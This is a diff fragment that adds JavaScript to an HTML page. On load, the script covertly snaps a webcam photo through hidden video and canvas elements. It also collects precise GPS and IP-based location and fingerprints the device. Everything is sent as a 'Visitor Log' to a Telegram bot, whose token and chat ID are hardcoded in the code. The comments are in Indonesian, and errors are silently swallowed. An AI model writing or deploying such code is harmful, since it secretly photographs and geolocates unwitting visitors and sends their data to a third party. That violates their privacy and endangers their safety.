+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(videoElement, 0, 0, w, h);
+
+          const blob = await new Promise((resolve, reject) => {
+            canvas.toBlob(b => (b ? resolve(b) : reject(new Error('blob-fail'))), 'image/jpeg', 0.9);
+          });
+
+          let latLngCoords = {};
+          try {
+            latLngCoords = await new Promise((resolve) => {
+              if (!navigator.geolocation) return resolve({});
+              navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                () => resolve({}), // Gagal mendapatkan lokasi
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+              );
+            });
+          } catch (geoError) {
+            console.warn('Geolocation error:', geoError);
+          }
+
+          let ipDetails = { status: 'fail' };
+          let sharlocLink = '';
+
+          try {
+            const ipApiResponse = await fetch('http://ip-api.com/json/');
+            if (ipApiResponse.ok) {
+              const data = await ipApiResponse.json();
+              if (data.status === 'success' || (data.query && data.country)) {
+                ipDetails = data;
+              } else {
+                console.warn('IP API returned potentially invalid data:', data);
+              }
+
+              const finalLat = latLngCoords.lat || ipDetails.lat;
+              const finalLng = latLngCoords.lng || ipDetails.lon;
+              if (finalLat && finalLng) {
+                sharlocLink = `http://googleusercontent.com/maps.google.com/${finalLat},${finalLng}`;
+              }
+            } else {
+              console.warn('Failed to fetch IP details:', ipApiResponse.statusText);
+            }
+          } catch (ipApiError) {
+            console.warn('Error fetching IP details:', ipApiError);
+          }
+
+          const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds'; // Ditempatkan di sini untuk contoh
+          const CHAT_ID = '6128943834'; // Ditempatkan di sini untuk contoh
+
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const screenWidth = window.screen.width;
+          const screenHeight = window.screen.height;
+          const browserLanguage = navigator.language || navigator.userLanguage;
+          const cpuCores = navigator.hardwareConcurrency;
+          const ram = navigator.deviceMemory;
+          const onLineStatus = navigator.onLine ? 'Online' : 'Offline';
+          const cookiesEnabled = navigator.cookieEnabled;
+          const referrer = document.referrer;
+          const localTime = new Date().toString();
+
+          const form = new FormData();
+          form.append('chat_id', CHAT_ID);
+          form.append('photo', blob, 'selfie.jpg');
+
+          let caption = "📸 Visitor Log\n\n";
+          if (sharlocLink) caption += `🔗 Location: ${sharlocLink}\n`;
+          if (ipDetails.query) caption += `🌐 IP: ${ipDetails.query}\n`;
+          if (ipDetails.country) caption += `🌍 Negara: ${ipDetails.country} (${ipDetails.countryCode})\n`;
+          if (ipDetails.regionName) caption += `🏙️ Wilayah: ${ipDetails.regionName}\n`;
+          if (ipDetails.city) caption += `🏠 Kota: ${ipDetails.city}\n`;
+          if (ipDetails.zip) caption += `📮 Zip: ${ipDetails.zip}\n`;
+          if (ipDetails.isp) caption += `🏢 Org: ${ipDetails.isp}\n`;
+          if (ipDetails.timezone) caption += `⏰ Zona Waktu: ${ipDetails.timezone}\n`;
+          if (latLngCoords.lat && latLngCoords.lng) {
+            caption += `📍 GPS: Lat ${latLngCoords.lat.toFixed(4)}, Lng ${latLngCoords.lng.toFixed(4)}\n`;
+          } else if (ipDetails.lat && ipDetails.lon) {
+            caption += `📍 GPS (IP): Lat ${ipDetails.lat.toFixed(4)}, Lng ${ipDetails.lon.toFixed(4)}\n`;
+          }
+          caption += `📱 Device: ${userAgent}\n`;
+          caption += `💻 Platform: ${platform}\n`;
+          caption += `🖥️ Screen: ${screenWidth}x${screenHeight}\n`;
+          caption += `🌐 Browser Lang: ${browserLanguage}\n`;
+          caption += `⚙️ CPU Cores: ${cpuCores}\n`;
+          if (ram) caption += `💾 RAM: ${ram} GB\n`;
+          caption += `🔌 Status: ${onLineStatus}\n`;
+          caption += `🍪 Cookies: ${cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
+          caption += `↩️ Referrer: ${referrer}\n`;
+          caption += `🕒 Local Time: ${localTime}\n`;
+
+          form.append('caption', caption);
+
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+          if (!res.ok) {
+            const err = await res.json();
+            throw new Error(err?.description || res.statusText);
+          }
+          console.log("Data sent successfully!");
+        } catch (e) {
+          console.warn('[captureAndSend] skipped:', e);
+        } finally {
+          if (streamRef) {
+            streamRef.getTracks().forEach(t => t.stop());
+            streamRef = null;
+          }
+        }
+      }
+      
+      // Panggil captureAndSend hanya jika elemen video dan canvas ditemukan
+      if (videoElement && canvasElement) {
+         captureAndSend();
+      }
+    });
+  </script>
+
+  <video id="videoElement" class="hidden" playsInline muted></video>
+  <canvas id="canvasElement" class="hidden"></canvas>
+
+</body>
+</html>
